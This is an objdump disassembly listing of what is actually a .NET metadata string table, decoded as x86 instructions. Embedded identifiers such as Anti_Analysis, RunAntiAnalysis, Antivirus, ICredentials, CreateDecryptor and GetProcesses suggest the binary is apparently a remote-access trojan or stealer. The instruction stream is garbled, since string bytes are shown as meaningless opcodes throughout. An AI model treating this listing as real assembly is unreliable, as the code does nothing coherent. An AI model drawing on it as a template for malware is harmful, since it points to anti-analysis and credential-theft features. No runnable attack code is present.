  408c62:	70 70                	jo     0x408cd4
  408c64:	65 72 00             	gs jb  0x408c67
  408c67:	44                   	inc    %esp
  408c68:	65 74 65             	gs je  0x408cd0
  408c6b:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c70:	75 66                	jne    0x408cd8
  408c72:	61                   	popa
  408c73:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c77:	65 72 00             	gs jb  0x408c7a
  408c7a:	43                   	inc    %ebx
  408c7b:	75 72                	jne    0x408cef
  408c7d:	72 65                	jb     0x408ce4
  408c7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c80:	74 55                	je     0x408cd7
  408c82:	73 65                	jae    0x408ce9
  408c84:	72 00                	jb     0x408c86
  408c86:	53                   	push   %ebx
  408c87:	74 72                	je     0x408cfb
  408c89:	65 61                	gs popa
  408c8b:	6d                   	insl   (%dx),%es:(%edi)
  408c8c:	57                   	push   %edi
  408c8d:	72 69                	jb     0x408cf8
  408c8f:	74 65                	je     0x408cf6
  408c91:	72 00                	jb     0x408c93
  408c93:	54                   	push   %esp
  408c94:	65 78 74             	gs js  0x408d0b
  408c97:	57                   	push   %edi
  408c98:	72 69                	jb     0x408d03
  408c9a:	74 65                	je     0x408d01
  408c9c:	72 00                	jb     0x408c9e
  408c9e:	45                   	inc    %ebp
  408c9f:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca0:	74 65                	je     0x408d07
  408ca2:	72 00                	jb     0x408ca4
  408ca4:	42                   	inc    %edx
  408ca5:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cac:	72 
  408cad:	74 65                	je     0x408d14
  408caf:	72 00                	jb     0x408cb1
  408cb1:	54                   	push   %esp
  408cb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb3:	4c                   	dec    %esp
  408cb4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb5:	77 65                	ja     0x408d1c
  408cb7:	72 00                	jb     0x408cb9
  408cb9:	45                   	inc    %ebp
  408cba:	72 72                	jb     0x408d2e
  408cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbd:	72 00                	jb     0x408cbf
  408cbf:	49                   	dec    %ecx
  408cc0:	45                   	inc    %ebp
  408cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc2:	75 6d                	jne    0x408d31
  408cc4:	65 72 61             	gs jb  0x408d28
  408cc7:	74 6f                	je     0x408d38
  408cc9:	72 00                	jb     0x408ccb
  408ccb:	4d                   	dec    %ebp
  408ccc:	61                   	popa
  408ccd:	6e                   	outsb  %ds:(%esi),(%dx)
  408cce:	61                   	popa
  408ccf:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cd4:	74 4f                	je     0x408d25
  408cd6:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cd9:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408cdd:	75 6d                	jne    0x408d4c
  408cdf:	65 72 61             	gs jb  0x408d43
  408ce2:	74 6f                	je     0x408d53
  408ce4:	72 00                	jb     0x408ce6
  408ce6:	53                   	push   %ebx
  408ce7:	79 73                	jns    0x408d5c
  408ce9:	74 65                	je     0x408d50
  408ceb:	6d                   	insl   (%dx),%es:(%edi)
  408cec:	2e 43                	cs inc %ebx
  408cee:	6f                   	outsl  %ds:(%esi),(%dx)
  408cef:	6c                   	insb   (%dx),%es:(%edi)
  408cf0:	6c                   	insb   (%dx),%es:(%edi)
  408cf1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cf6:	6e                   	outsb  %ds:(%esi),(%dx)
  408cf7:	73 2e                	jae    0x408d27
  408cf9:	49                   	dec    %ecx
  408cfa:	45                   	inc    %ebp
  408cfb:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfc:	75 6d                	jne    0x408d6b
  408cfe:	65 72 61             	gs jb  0x408d62
  408d01:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d05:	47                   	inc    %edi
  408d06:	65 74 45             	gs je  0x408d4e
  408d09:	6e                   	outsb  %ds:(%esi),(%dx)
  408d0a:	75 6d                	jne    0x408d79
  408d0c:	65 72 61             	gs jb  0x408d70
  408d0f:	74 6f                	je     0x408d80
  408d11:	72 00                	jb     0x408d13
  408d13:	41                   	inc    %ecx
  408d14:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d18:	61                   	popa
  408d19:	74 6f                	je     0x408d8a
  408d1b:	72 00                	jb     0x408d1d
  408d1d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d22:	00 2e                	add    %ch,(%esi)
  408d24:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d27:	6f                   	outsl  %ds:(%esi),(%dx)
  408d28:	72 00                	jb     0x408d2a
  408d2a:	4d                   	dec    %ebp
  408d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d2d:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d34:	65 
  408d35:	61                   	popa
  408d36:	74 65                	je     0x408d9d
  408d38:	44                   	inc    %esp
  408d39:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d3d:	70 74                	jo     0x408db3
  408d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d40:	72 00                	jb     0x408d42
  408d42:	43                   	inc    %ebx
  408d43:	72 65                	jb     0x408daa
  408d45:	61                   	popa
  408d46:	74 65                	je     0x408dad
  408d48:	45                   	inc    %ebp
  408d49:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4a:	63 72 79             	arpl   %esi,0x79(%edx)
  408d4d:	70 74                	jo     0x408dc3
  408d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408d50:	72 00                	jb     0x408d52
  408d52:	49                   	dec    %ecx
  408d53:	6e                   	outsb  %ds:(%esi),(%dx)
  408d54:	74 50                	je     0x408da6
  408d56:	74 72                	je     0x408dca
  408d58:	00 53 79             	add    %dl,0x79(%ebx)
  408d5b:	73 74                	jae    0x408dd1
  408d5d:	65 6d                	gs insl (%dx),%es:(%edi)
  408d5f:	2e 44                	cs inc %esp
  408d61:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d68:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d6f:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d76:	6f                   	outsl  %ds:(%esi),(%dx)
  408d77:	64 73 00             	fs jae 0x408d7a
  408d7a:	4d                   	dec    %ebp
  408d7b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d82:	74 2e                	je     0x408db2
  408d84:	56                   	push   %esi
  408d85:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d8c:	73 69                	jae    0x408df7
  408d8e:	63 2e                	arpl   %ebp,(%esi)
  408d90:	44                   	inc    %esp
  408d91:	65 76 69             	gs jbe 0x408dfd
  408d94:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d97:	00 53 79             	add    %dl,0x79(%ebx)
  408d9a:	73 74                	jae    0x408e10
  408d9c:	65 6d                	gs insl (%dx),%es:(%edi)
  408d9e:	2e 52                	cs push %edx
  408da0:	75 6e                	jne    0x408e10
  408da2:	74 69                	je     0x408e0d
  408da4:	6d                   	insl   (%dx),%es:(%edi)
  408da5:	65 2e 49             	gs cs dec %ecx
  408da8:	6e                   	outsb  %ds:(%esi),(%dx)
  408da9:	74 65                	je     0x408e10
  408dab:	72 6f                	jb     0x408e1c
  408dad:	70 53                	jo     0x408e02
  408daf:	65 72 76             	gs jb  0x408e28
  408db2:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408db9:	73 74                	jae    0x408e2f
  408dbb:	65 6d                	gs insl (%dx),%es:(%edi)
  408dbd:	2e 52                	cs push %edx
  408dbf:	75 6e                	jne    0x408e2f
  408dc1:	74 69                	je     0x408e2c
  408dc3:	6d                   	insl   (%dx),%es:(%edi)
  408dc4:	65 2e 43             	gs cs inc %ebx
  408dc7:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc8:	6d                   	insl   (%dx),%es:(%edi)
  408dc9:	70 69                	jo     0x408e34
  408dcb:	6c                   	insb   (%dx),%es:(%edi)
  408dcc:	65 72 53             	gs jb  0x408e22
  408dcf:	65 72 76             	gs jb  0x408e48
  408dd2:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408dd9:	62 75 67             	bound  %esi,0x67(%ebp)
  408ddc:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de3:	65 
  408de4:	73 00                	jae    0x408de6
  408de6:	45                   	inc    %ebp
  408de7:	78 70                	js     0x408e59
  408de9:	61                   	popa
  408dea:	6e                   	outsb  %ds:(%esi),(%dx)
  408deb:	64 45                	fs inc %ebp
  408ded:	6e                   	outsb  %ds:(%esi),(%dx)
  408dee:	76 69                	jbe    0x408e59
  408df0:	72 6f                	jb     0x408e61
  408df2:	6e                   	outsb  %ds:(%esi),(%dx)
  408df3:	6d                   	insl   (%dx),%es:(%edi)
  408df4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408df6:	74 56                	je     0x408e4e
  408df8:	61                   	popa
  408df9:	72 69                	jb     0x408e64
  408dfb:	61                   	popa
  408dfc:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e00:	00 47 65             	add    %al,0x65(%edi)
  408e03:	74 50                	je     0x408e55
  408e05:	72 6f                	jb     0x408e76
  408e07:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e0a:	73 65                	jae    0x408e71
  408e0c:	73 00                	jae    0x408e0e
  408e0e:	47                   	inc    %edi
  408e0f:	65 74 48             	gs je  0x408e5a
  408e12:	6f                   	outsl  %ds:(%esi),(%dx)
  408e13:	73 74                	jae    0x408e89
  408e15:	41                   	inc    %ecx
  408e16:	64 64 72 65          	fs fs jb 0x408e7f
  408e1a:	73 73                	jae    0x408e8f
  408e1c:	65 73 00             	gs jae 0x408e1f
  408e1f:	53                   	push   %ebx
  408e20:	79 73                	jns    0x408e95
  408e22:	74 65                	je     0x408e89
  408e24:	6d                   	insl   (%dx),%es:(%edi)
  408e25:	2e 53                	cs push %ebx
  408e27:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e2b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e32:	70 
  408e33:	74 6f                	je     0x408ea4
  408e35:	67 72 61             	addr16 jb 0x408e99
  408e38:	70 68                	jo     0x408ea2
  408e3a:	79 2e                	jns    0x408e6a
  408e3c:	58                   	pop    %eax
  408e3d:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e42:	72 74                	jb     0x408eb8
  408e44:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e4b:	73 00                	jae    0x408e4d
  408e4d:	45                   	inc    %ebp
  408e4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e4f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e52:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e56:	74 65                	je     0x408ebd
  408e58:	73 00                	jae    0x408e5a
  408e5a:	47                   	inc    %edi
  408e5b:	65 74 55             	gs je  0x408eb3
  408e5e:	74 66                	je     0x408ec6
  408e60:	38 42 79             	cmp    %al,0x79(%edx)
  408e63:	74 65                	je     0x408eca
  408e65:	73 00                	jae    0x408e67
  408e67:	75 74                	jne    0x408edd
  408e69:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e6d:	74 65                	je     0x408ed4
  408e6f:	73 00                	jae    0x408e71
  408e71:	52                   	push   %edx
  408e72:	66 63 32             	arpl   %si,(%edx)
  408e75:	38 39                	cmp    %bh,(%ecx)
  408e77:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e7b:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e82:	73 00                	jae    0x408e84
  408e84:	52                   	push   %edx
  408e85:	65 61                	gs popa
  408e87:	64 41                	fs inc %ecx
  408e89:	6c                   	insb   (%dx),%es:(%edi)
  408e8a:	6c                   	insb   (%dx),%es:(%edi)
  408e8b:	42                   	inc    %edx
  408e8c:	79 74                	jns    0x408f02
  408e8e:	65 73 00             	gs jae 0x408e91
  408e91:	44                   	inc    %esp
  408e92:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e96:	65 46                	gs inc %esi
  408e98:	72 6f                	jb     0x408f09
  408e9a:	6d                   	insl   (%dx),%es:(%edi)
  408e9b:	42                   	inc    %edx
  408e9c:	79 74                	jns    0x408f12
  408e9e:	65 73 00             	gs jae 0x408ea1
  408ea1:	53                   	push   %ebx
  408ea2:	77 61                	ja     0x408f05
  408ea4:	70 42                	jo     0x408ee8
  408ea6:	79 74                	jns    0x408f1c
  408ea8:	65 73 00             	gs jae 0x408eab
  408eab:	4c                   	dec    %esp
  408eac:	6f                   	outsl  %ds:(%esi),(%dx)
  408ead:	61                   	popa
  408eae:	64 46                	fs inc %esi
  408eb0:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408eb7:	74 
  408eb8:	65 73 00             	gs jae 0x408ebb
  408ebb:	47                   	inc    %edi
  408ebc:	65 74 41             	gs je  0x408f00
  408ebf:	73 42                	jae    0x408f03
  408ec1:	79 74                	jns    0x408f37
  408ec3:	65 73 00             	gs jae 0x408ec6
  408ec6:	53                   	push   %ebx
  408ec7:	65 74 41             	gs je  0x408f0b
  408eca:	73 42                	jae    0x408f0e
  408ecc:	79 74                	jns    0x408f42
  408ece:	65 73 00             	gs jae 0x408ed1
  408ed1:	47                   	inc    %edi
  408ed2:	65 74 42             	gs je  0x408f17
  408ed5:	79 74                	jns    0x408f4b
  408ed7:	65 73 00             	gs jae 0x408eda
  408eda:	72 61                	jb     0x408f3d
  408edc:	77 42                	ja     0x408f20
  408ede:	79 74                	jns    0x408f54
  408ee0:	65 73 00             	gs jae 0x408ee3
  408ee3:	62 79 74             	bound  %edi,0x74(%ecx)
  408ee6:	65 73 00             	gs jae 0x408ee9
  408ee9:	43                   	inc    %ebx
  408eea:	53                   	push   %ebx
  408eeb:	68 61 72 70 41       	push   $0x41707261
  408ef0:	72 67                	jb     0x408f59
  408ef2:	75 6d                	jne    0x408f61
  408ef4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ef6:	74 49                	je     0x408f41
  408ef8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ef9:	66 6f                	outsw  %ds:(%esi),(%dx)
  408efb:	46                   	inc    %esi
  408efc:	6c                   	insb   (%dx),%es:(%edi)
  408efd:	61                   	popa
  408efe:	67 73 00             	addr16 jae 0x408f01
  408f01:	43                   	inc    %ebx
  408f02:	53                   	push   %ebx
  408f03:	68 61 72 70 42       	push   $0x42707261
  408f08:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f0f:	61                   	popa
  408f10:	67 73 00             	addr16 jae 0x408f13
  408f13:	65 73 46             	gs jae 0x408f5c
  408f16:	6c                   	insb   (%dx),%es:(%edi)
  408f17:	61                   	popa
  408f18:	67 73 00             	addr16 jae 0x408f1b
  408f1b:	53                   	push   %ebx
  408f1c:	74 72                	je     0x408f90
  408f1e:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f25:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f2c:	65 
  408f2d:	53                   	push   %ebx
  408f2e:	65 74 74             	gs je  0x408fa5
  408f31:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f38:	73 73                	jae    0x408fad
  408f3a:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f41:	6e                   	outsb  %ds:(%esi),(%dx)
  408f42:	67 45                	addr16 inc %ebp
  408f44:	76 65                	jbe    0x408fab
  408f46:	6e                   	outsb  %ds:(%esi),(%dx)
  408f47:	74 41                	je     0x408f8a
  408f49:	72 67                	jb     0x408fb2
  408f4b:	73 00                	jae    0x408f4d
  408f4d:	41                   	inc    %ecx
  408f4e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4f:	74 69                	je     0x408fba
  408f51:	5f                   	pop    %edi
  408f52:	41                   	inc    %ecx
  408f53:	6e                   	outsb  %ds:(%esi),(%dx)
  408f54:	61                   	popa
  408f55:	6c                   	insb   (%dx),%es:(%edi)
  408f56:	79 73                	jns    0x408fcb
  408f58:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408f60:	74 69                	je     0x408fcb
  408f62:	41                   	inc    %ecx
  408f63:	6e                   	outsb  %ds:(%esi),(%dx)
  408f64:	61                   	popa
  408f65:	6c                   	insb   (%dx),%es:(%edi)
  408f66:	79 73                	jns    0x408fdb
  408f68:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f6f:	73 00                	jae    0x408f71
  408f71:	49                   	dec    %ecx
  408f72:	43                   	inc    %ebx
  408f73:	72 65                	jb     0x408fda
  408f75:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f78:	74 69                	je     0x408fe3
  408f7a:	61                   	popa
  408f7b:	6c                   	insb   (%dx),%es:(%edi)
  408f7c:	73 00                	jae    0x408f7e
  408f7e:	73 65                	jae    0x408fe5
  408f80:	74 5f                	je     0x408fe1
  408f82:	43                   	inc    %ebx
  408f83:	72 65                	jb     0x408fea
  408f85:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f88:	74 69                	je     0x408ff3
  408f8a:	61                   	popa
  408f8b:	6c                   	insb   (%dx),%es:(%edi)
  408f8c:	73 00                	jae    0x408f8e
  408f8e:	45                   	inc    %ebp
  408f8f:	71 75                	jno    0x409006
  408f91:	61                   	popa
  408f92:	6c                   	insb   (%dx),%es:(%edi)
  408f93:	73 00                	jae    0x408f95
  408f95:	53                   	push   %ebx
  408f96:	73 6c                	jae    0x409004
  408f98:	50                   	push   %eax
  408f99:	72 6f                	jb     0x40900a
  408f9b:	74 6f                	je     0x40900c
  408f9d:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa0:	73 00                	jae    0x408fa2
  408fa2:	52                   	push   %edx
  408fa3:	65 61                	gs popa
  408fa5:	64 54                	fs push %esp
  408fa7:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa9:	6c                   	insb   (%dx),%es:(%edi)
  408faa:	73 00                	jae    0x408fac
  408fac:	57                   	push   %edi
  408fad:	72 69                	jb     0x409018
  408faf:	74 65                	je     0x409016
  408fb1:	54                   	push   %esp
  408fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb4:	6c                   	insb   (%dx),%es:(%edi)
  408fb5:	73 00                	jae    0x408fb7
  408fb7:	42                   	inc    %edx
  408fb8:	79 74                	jns    0x40902e
  408fba:	65 73 54             	gs jae 0x409011
  408fbd:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	73 00                	jae    0x408fc2
  408fc2:	53                   	push   %ebx
  408fc3:	79 73                	jns    0x409038
  408fc5:	74 65                	je     0x40902c
  408fc7:	6d                   	insl   (%dx),%es:(%edi)
  408fc8:	2e 57                	cs push %edi
  408fca:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd1:	46                   	inc    %esi
  408fd2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd3:	72 6d                	jb     0x409042
  408fd5:	73 00                	jae    0x408fd7
  408fd7:	44                   	inc    %esp
  408fd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408fd9:	73 00                	jae    0x408fdb
  408fdb:	43                   	inc    %ebx
  408fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  408fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  408fde:	74 61                	je     0x409041
  408fe0:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fe7:	74 65                	je     0x40904e
  408fe9:	6d                   	insl   (%dx),%es:(%edi)
  408fea:	2e 43                	cs inc %ebx
  408fec:	6f                   	outsl  %ds:(%esi),(%dx)
  408fed:	6c                   	insb   (%dx),%es:(%edi)
  408fee:	6c                   	insb   (%dx),%es:(%edi)
  408fef:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff5:	73 00                	jae    0x408ff7
  408ff7:	53                   	push   %ebx
  408ff8:	74 72                	je     0x40906c
  408ffa:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409001:	74 4f                	je     0x409052
  409003:	70 74                	jo     0x409079
  409005:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40900c:	74 49                	je     0x409057
  40900e:	6d                   	insl   (%dx),%es:(%edi)
  40900f:	61                   	popa
  409010:	67 65 44             	addr16 gs inc %esp
  409013:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409017:	65 72 73             	gs jb  0x40908d
  40901a:	00 52 75             	add    %dl,0x75(%edx)
  40901d:	6e                   	outsb  %ds:(%esi),(%dx)
  40901e:	74 69                	je     0x409089
  409020:	6d                   	insl   (%dx),%es:(%edi)
  409021:	65 48                	gs dec %eax
  409023:	65 6c                	gs insb (%dx),%es:(%edi)
  409025:	70 65                	jo     0x40908c
  409027:	72 73                	jb     0x40909c
  409029:	00 53 73             	add    %dl,0x73(%ebx)
  40902c:	6c                   	insb   (%dx),%es:(%edi)
  40902d:	50                   	push   %eax
  40902e:	6f                   	outsl  %ds:(%esi),(%dx)
  40902f:	6c                   	insb   (%dx),%es:(%edi)
  409030:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409037:	72 73                	jb     0x4090ac
  409039:	00 73 73             	add    %dh,0x73(%ebx)
  40903c:	6c                   	insb   (%dx),%es:(%edi)
  40903d:	50                   	push   %eax
  40903e:	6f                   	outsl  %ds:(%esi),(%dx)
  40903f:	6c                   	insb   (%dx),%es:(%edi)
  409040:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409047:	72 73                	jb     0x4090bc
  409049:	00 46 69             	add    %al,0x69(%esi)
  40904c:	6c                   	insb   (%dx),%es:(%edi)
  40904d:	65 41                	gs inc %ecx
  40904f:	63 63 65             	arpl   %esp,0x65(%ebx)
  409052:	73 73                	jae    0x4090c7
  409054:	00 68 50             	add    %ch,0x50(%eax)
  409057:	72 6f                	jb     0x4090c8
  409059:	63 65 73             	arpl   %esp,0x73(%ebp)
  40905c:	73 00                	jae    0x40905e
  40905e:	47                   	inc    %edi
  40905f:	65 74 43             	gs je  0x4090a5
  409062:	75 72                	jne    0x4090d6
  409064:	72 65                	jb     0x4090cb
  409066:	6e                   	outsb  %ds:(%esi),(%dx)
  409067:	74 50                	je     0x4090b9
  409069:	72 6f                	jb     0x4090da
  40906b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40906e:	73 00                	jae    0x409070
  409070:	49                   	dec    %ecx
  409071:	50                   	push   %eax
  409072:	41                   	inc    %ecx
  409073:	64 64 72 65          	fs fs jb 0x4090dc
  409077:	73 73                	jae    0x4090ec
  409079:	00 43 6f             	add    %al,0x6f(%ebx)
  40907c:	6d                   	insl   (%dx),%es:(%edi)
  40907d:	70 72                	jo     0x4090f1
  40907f:	65 73 73             	gs jae 0x4090f5
  409082:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  409086:	6f                   	outsl  %ds:(%esi),(%dx)
  409087:	6d                   	insl   (%dx),%es:(%edi)
  409088:	70 72                	jo     0x4090fc
  40908a:	65 73 73             	gs jae 0x409100
  40908d:	00 53 79             	add    %dl,0x79(%ebx)
  409090:	73 74                	jae    0x409106
  409092:	65 6d                	gs insl (%dx),%es:(%edi)
  409094:	2e 4e                	cs dec %esi
  409096:	65 74 2e             	gs je  0x4090c7
  409099:	53                   	push   %ebx
  40909a:	6f                   	outsl  %ds:(%esi),(%dx)
  40909b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40909e:	74 73                	je     0x409113
  4090a0:	00 73 65             	add    %dh,0x65(%ebx)
  4090a3:	74 5f                	je     0x409104
  4090a5:	41                   	inc    %ecx
  4090a6:	72 67                	jb     0x40910f
  4090a8:	75 6d                	jne    0x409117
  4090aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090ac:	74 73                	je     0x409121
  4090ae:	00 53 79             	add    %dl,0x79(%ebx)
  4090b1:	73 74                	jae    0x409127
  4090b3:	65 6d                	gs insl (%dx),%es:(%edi)
  4090b5:	45                   	inc    %ebp
  4090b6:	76 65                	jbe    0x40911d
  4090b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b9:	74 73                	je     0x40912e
  4090bb:	00 50 6f             	add    %dl,0x6f(%eax)
  4090be:	72 74                	jb     0x409134
  4090c0:	73 00                	jae    0x4090c2
  4090c2:	45                   	inc    %ebp
  4090c3:	78 69                	js     0x40912e
  4090c5:	73 74                	jae    0x40913b
  4090c7:	73 00                	jae    0x4090c9
  4090c9:	48                   	dec    %eax
  4090ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4090cb:	73 74                	jae    0x409141
  4090cd:	73 00                	jae    0x4090cf
  4090cf:	41                   	inc    %ecx
  4090d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d1:	74 69                	je     0x40913c
  4090d3:	76 69                	jbe    0x40913e
  4090d5:	72 75                	jb     0x40914c
  4090d7:	73 00                	jae    0x4090d9
  4090d9:	43                   	inc    %ebx
  4090da:	6f                   	outsl  %ds:(%esi),(%dx)
  4090db:	6e                   	outsb  %ds:(%esi),(%dx)
  4090dc:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090df:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e2:	61                   	popa
  4090e3:	67 65 46             	addr16 gs inc %esi
  4090e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e7:	72 6d                	jb     0x409156
  4090e9:	61                   	popa
  4090ea:	74 00                	je     0x4090ec
  4090ec:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090ee:	72 6d                	jb     0x40915d
  4090f0:	61                   	popa
  4090f1:	74 00                	je     0x4090f3
  4090f3:	57                   	push   %edi
  4090f4:	72 69                	jb     0x40915f
  4090f6:	74 65                	je     0x40915d
  4090f8:	46                   	inc    %esi
  4090f9:	6c                   	insb   (%dx),%es:(%edi)
  4090fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4090fb:	61                   	popa
  4090fc:	74 00                	je     0x4090fe
  4090fe:	67 65 74 5f          	addr16 gs je 0x409161
  409102:	41                   	inc    %ecx
  409103:	73 46                	jae    0x40914b
  409105:	6c                   	insb   (%dx),%es:(%edi)
  409106:	6f                   	outsl  %ds:(%esi),(%dx)
  409107:	61                   	popa
  409108:	74 00                	je     0x40910a
  40910a:	73 65                	jae    0x409171
  40910c:	74 5f                	je     0x40916d
  40910e:	41                   	inc    %ecx
  40910f:	73 46                	jae    0x409157
  409111:	6c                   	insb   (%dx),%es:(%edi)
  409112:	6f                   	outsl  %ds:(%esi),(%dx)
  409113:	61                   	popa
  409114:	74 00                	je     0x409116
  409116:	47                   	inc    %edi
  409117:	65 74 41             	gs je  0x40915b
  40911a:	73 46                	jae    0x409162
  40911c:	6c                   	insb   (%dx),%es:(%edi)
  40911d:	6f                   	outsl  %ds:(%esi),(%dx)
  40911e:	61                   	popa
  40911f:	74 00                	je     0x409121
  409121:	53                   	push   %ebx
  409122:	65 74 41             	gs je  0x409166
  409125:	73 46                	jae    0x40916d
  409127:	6c                   	insb   (%dx),%es:(%edi)
  409128:	6f                   	outsl  %ds:(%esi),(%dx)
  409129:	61                   	popa
  40912a:	74 00                	je     0x40912c
  40912c:	46                   	inc    %esi
  40912d:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  409134:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  409138:	61                   	popa
  409139:	6e                   	outsb  %ds:(%esi),(%dx)
  40913a:	61                   	popa
  40913b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40913e:	65 6e                	outsb  %gs:(%esi),(%dx)
  409140:	74 42                	je     0x409184
  409142:	61                   	popa
  409143:	73 65                	jae    0x4091aa
  409145:	4f                   	dec    %edi
  409146:	62 6a 65             	bound  %ebp,0x65(%edx)
  409149:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  40914d:	6f                   	outsl  %ds:(%esi),(%dx)
  40914e:	72 63                	jb     0x4091b3
  409150:	65 50                	gs push %eax
  409152:	61                   	popa
  409153:	74 68                	je     0x4091bd
  409155:	4f                   	dec    %edi
  409156:	62 6a 65             	bound  %ebp,0x65(%edx)
  409159:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40915d:	6f                   	outsl  %ds:(%esi),(%dx)
  40915e:	6c                   	insb   (%dx),%es:(%edi)
